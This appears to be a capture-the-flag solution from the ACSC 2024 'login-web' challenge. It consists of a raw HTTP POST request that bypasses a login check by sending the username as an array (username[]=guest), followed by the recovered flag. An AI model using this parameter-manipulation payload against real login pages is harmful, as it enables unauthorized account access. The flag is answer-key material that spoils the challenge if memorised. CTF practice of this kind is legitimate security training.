```
POST /login HTTP/1.1
Host: login-web.chal.2024.ctf.acsc.asia:5000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Origin: http://login-web.chal.2024.ctf.acsc.asia:5000
Connection: close
Referer: http://login-web.chal.2024.ctf.acsc.asia:5000/
Upgrade-Insecure-Requests: 1

username[]=guest&password=guest
```
flag: ACSC{y3t_an0th3r_l0gin_byp4ss}